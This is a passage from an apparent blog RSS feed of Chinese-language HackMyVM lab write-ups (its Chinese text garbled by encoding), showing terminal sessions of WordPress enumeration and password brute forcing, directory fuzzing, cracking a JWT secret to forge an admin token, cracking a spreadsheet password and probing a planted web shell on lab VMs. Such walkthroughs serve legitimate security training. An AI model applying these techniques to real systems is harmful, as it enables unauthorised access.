 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'
 | Confirmed By: Rss Generator (Aggressive Detection)
 |  - http://192.168.205.142/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://192.168.205.142/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] ta0
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] welcome
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 18

[+] Finished: Wed Jan 15 20:13:57 2025
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 13.267 KB
[+] Data Received: 413.04 KB
[+] Memory used: 229.277 MB
[+] Elapsed time: 00:00:07
                                                     
```

ä¸»è¦çš„ä¿¡æ¯æœ‰`WordPress 6.7.1`å’Œä¸¤ä¸ªç”¨æˆ·å`ta0`ã€`welcome`ï¼Œä½†æ˜¯`WordPress 6.7.1`æ²¡æœ‰æ¼æ´ï¼Œåªå¯ä»¥çˆ†ç ´å¯†ç äº†

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

ï¼ˆçœç•¥ï¼‰

[+] Performing password attack on Xmlrpc against 2 user/s
Trying ta0 / speaker Time: 00:01:37 &lt;=========================================================&gt; (10000 / 10000) 100.00% Time: 00:01:37

[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 15 20:18:29 2025
[+] Requests Done: 10142
[+] Cached Requests: 34
[+] Data Sent: 5.147 MB
[+] Data Received: 5.559 MB
[+] Memory used: 278.031 MB
[+] Elapsed time: 00:01:40

```

çˆ†ç ´äº†å‰5000è¡Œ`rockyou.txt`éƒ½æ²¡æœ‰ç»“æœï¼Œæ²¡æœ‰å¿…è¦çˆ†ç ´äº†ï¼Œæ ¹æ®ç°åœ¨è·å¾—çš„ä¿¡æ¯æ— æ³•åˆ¤æ–­å‡ºæ”»å‡»é¢ï¼Œä½†æ˜¯`WordPress`é¶æœºè¿˜æœ‰ä¸€ä¸ªæ”»å‡»ç‚¹â€”â€”**æ’ä»¶**

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-tokenæ³¨å†Œwpscanå®˜ç½‘è·å–
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
ï¼ˆçœç•¥ï¼‰

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:17:12 &lt;================================================&gt; (108550 / 108550) 100.00% Time: 00:17:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.205.142/wp-content/plugins/akismet/
 | Latest Version: 5.3.5 (up to date)
 | Last Updated: 2024-11-19T02:02:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt

[+] feed
 | Location: http://192.168.205.142/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] wp-query-console
 | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console &lt;= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 15

[+] Finished: Wed Jan 15 20:39:16 2025
[+] Requests Done: 108575
[+] Cached Requests: 44
[+] Data Sent: 29.36 MB
[+] Data Received: 32.766 MB
[+] Memory used: 479.719 MB
[+] Elapsed time: 00:17:25

```

`wp-query-console`æœ‰æ¼æ´ï¼Œæˆ‘ä»¬å»æœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰åˆ©ç”¨æ–¹æ¡ˆã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_buster.html</guid><pubDate>Thu, 20 Mar 2025 07:57:23 +0000</pubDate></item><item><title>hmv_Blackhat2</title><link>https://7r1UMPH.github.io/post/hmv_Blackhat2.html</link><description># hmv_Blackhat2

**é¶æœº**ï¼š[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)
**éš¾åº¦**ï¼šé»„è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.218
**æœ¬æœº IP**ï¼š192.168.205.141

## 1. ç«¯å£æšä¸¾åŠæœåŠ¡æ¢æµ‹

é¦–å…ˆï¼Œä½¿ç”¨ `nmap` æ‰«æç›®æ ‡ IP çš„å¼€æ”¾ç«¯å£ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST
Nmap scan report for 192.168.205.218
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
MAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ä» `nmap` æ‰«æç»“æœæ¥çœ‹ï¼Œç›®æ ‡æœºå™¨å¼€æ”¾äº† 22 (SSH) å’Œ 80 (HTTP) ç«¯å£ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Blackhat2.html</guid><pubDate>Thu, 20 Mar 2025 07:56:22 +0000</pubDate></item><item><title>hmv_azer</title><link>https://7r1UMPH.github.io/post/hmv_azer.html</link><description># hmv_azer

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.235
**æœ¬æœº IP**ï¼š192.168.205.141

---

# 1.æ‰«æ

ä½¿ç”¨ `Nmap` è¿›è¡Œåˆæ­¥ç«¯å£æ‰«æï¼Œä»¥è¯†åˆ«å¼€æ”¾çš„æœåŠ¡å’Œç«¯å£ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS -p- -Pn -n -T4 192.168.205.235
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST
Nmap scan report for 192.168.205.235
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                           
```

ç»“æœæ˜¾ç¤ºä¸¤ä¸ªå¼€æ”¾ç«¯å£ï¼š

**80/tcp** - HTTP æœåŠ¡
**3000/tcp** - åŸå§‹æ˜¾ç¤ºä¸º PPPï¼Œä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ª web åº”ç”¨ç¨‹åºï¼Œç”¨äºç”¨æˆ·è®¤è¯

---

# 2.è¸©ç‚¹

`80`ç«¯å£é¡µæ²¡æœ‰å‘ç°æ˜æ˜¾åˆ©ç”¨ç‚¹ï¼Œè¸©ç‚¹`3000`ç«¯å£

![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)

![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)

![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)

åœ¨è¿›ä¸€æ­¥æ¢ç´¢ä¸­å‘ç°ï¼Œ**3000** ç«¯å£çš„åº”ç”¨ç¨‹åºä¼¼ä¹é€šè¿‡æ‰§è¡Œ `.sh` è„šæœ¬æ¥è¿›è¡Œå¯†ç éªŒè¯ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_azer.html</guid><pubDate>Thu, 20 Mar 2025 07:55:21 +0000</pubDate></item><item><title>hmv_aurora</title><link>https://7r1UMPH.github.io/post/hmv_aurora.html</link><description># hmv_aurora

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.138
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
Nmap scan report for 192.168.205.138
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

**3000**å¤§æ¦‚ç‡æ˜¯**web**é¡µé¢

# 2.è¸©ç‚¹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

ç¦æ­¢`GET`è®¿é—®ï¼Œé‚£æˆ‘ä»¬å°±`POST`

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.205.138:3000
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, html, txt, md]
 ğŸ  HTTP methods          â”‚ [POST]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
401     POST        1l        2w       22c http://192.168.205.138:3000/login
400     POST        1l        6w       29c http://192.168.205.138:3000/register
401     POST        1l        2w       22c http://192.168.205.138:3000/Login
400     POST        1l        6w       29c http://192.168.205.138:3000/Register
401     POST        1l        1w       12c http://192.168.205.138:3000/execute

```

ä½¿ç”¨`curl`è®¿é—®

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/login -X POST
Identifiants invalides                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/register -X POST
The 'role' field is not valid                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/execute -X POST 
Unauthorized                                                                                                                                    

```

æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·è¯•è¯•

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'admin\'}'
Not authorized !
```

å•Šè¿™ï¼Œä¸¢å»`WFUZZ`çˆ†ç ´ä¸€ä¸‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\'role\':\'FUZZ\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/register
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   401        0 L      3 W        16 Ch       'admin'                                                             
000000022:   500        0 L      5 W        32 Ch       'user'                                                              

Total time: 58.91045
Processed Requests: 62284
Filtered Requests: 62282
Requests/sec.: 1057.265

```

ç»§ç»­æ³¨å†Œ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\'}' 
Column 'username' cannot be null                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\'}'
Column 'password' cannot be null                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
Registration OK                                                                                                                                     
```

å»ç™»å½•è¯•è¯•

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}
```

è¿™å¾ˆ`jwt`ï¼Œå»å°è¯•è§£ç ï¼Œ[ç½‘ç«™](https://jwt.io/)

![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)

å°†å¯†é’¥çˆ†ç ´ä¸€ä¸‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' &gt; hash
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)   
1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```

æ”¹ä¸€ä¸‹å‚æ•°

![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)

å°è¯•ä¸€ä¸‹é‚£ä¸ª`execute`

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;file&amp;quot; argument must be of type string. Received undefined&lt;br&gt; &amp;nbsp; &amp;nbsp;at validateString (internal/validators.js:120:11)&lt;br&gt; &amp;nbsp; &amp;nbsp;at normalizeSpawnArguments (child_process.js:411:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at spawn (child_process.js:547:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.execFile (child_process.js:237:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at exec (child_process.js:158:25)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:69:3&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:112:5&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

`Authorization` å¤´ä»¥ `Bearer` å¼€å¤´ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_aurora.html</guid><pubDate>Thu, 20 Mar 2025 07:54:19 +0000</pubDate></item><item><title>hmv_Arroutada</title><link>https://7r1UMPH.github.io/post/hmv_Arroutada.html</link><description># hmv_Arroutada

# 0.ç®€ä»‹

**é¶æœº**ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Arroutada  
**éš¾åº¦**ï¼šç»¿è‰²  
**ç›®æ ‡ IP**ï¼š192.168.205.151  
**æœ¬æœº IP**ï¼š192.168.205.128

# 1.æ‰«æ

â€‹`nmap`â€‹èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -A -Pn -n --min-rate 10000 192.168.205.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST
Nmap scan report for 192.168.205.151
Host is up (0.00024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:06:46:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 192.168.205.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
                                                        
```

# 2.è¸©ç‚¹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.151
&lt;div align='center'&gt;&lt;img src='imgs/apreton.png'&gt;&lt;/div&gt;

```

çˆ†ç ´ç›®å½•

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/.                    (Status: 200) [Size: 59]
/imgs                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.151/imgs/]
/scout                (Status: 301) [Size: 318] [--&gt; http://192.168.205.151/scout/]
Progress: 598000 / 598005 (100.00%)
===============================================================                                                                      
Finished
===============================================================

```

æŸ¥çœ‹/scout

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.151/scout/

&lt;div&gt;
&lt;p&gt;
Hi, Telly,
&lt;br&gt;
&lt;br&gt;
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
&lt;br&gt;
/scout/******/docs/
&lt;br&gt;
&lt;br&gt;
With continued gratitude,
&lt;br&gt;
J1.
&lt;/p&gt;
&lt;/div&gt;
&lt;!-- Stop please --&gt;

```

çˆ†ç ´

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ wfuzz -u '192.168.205.151/scout/FUZZ/docs/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/scout/FUZZ/docs/
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000021664:   200        1016 L   12059 W    189769 Ch   'j2'                                                                

Total time: 59.22016
Processed Requests: 119600
Filtered Requests: 119599
Requests/sec.: 2019.582

```

![image](assets/image-20250208171240-95jvvsi.png)

pass.txtæ˜¯åºŸè¯ï¼Œç›´æ¥ä¸‹shellfile.odsï¼Œç„¶åæœ‰å¯†ç ï¼Œæˆ‘ä»¬çˆ†ç ´ä¸€ä¸‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ file shellfile.ods                                            
shellfile.ods: OpenDocument Spreadsheet
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 512/512 AVX512BW 16x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)   
1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
Use the '--show --format=ODF' options to display all of the cracked passwords reliably
Session completed. 

```

æ‰“å¼€ç»™äº†æˆ‘ä»¬ä¸€ä¸ªè·¯å¾„/thejabasshell.phpï¼Œç‚¹è¿›å»æ˜¯ç©ºç™½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿›è¡Œçˆ†ç ´

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000280:   200        0 L      5 W        33 Ch       'a'                                                                 
000000557:   200        0 L      0 W        0 Ch        'Controls'                                                          

Total time: 0
Processed Requests: 474
Filtered Requests: 473
Requests/sec.: 0

â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.151/thejabasshell.php?a=id
Error: Problem with parameter 'b'                                                                                                                                
```

è¿˜è¦ä¸€ä¸ªbçš„å‚æ•°

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
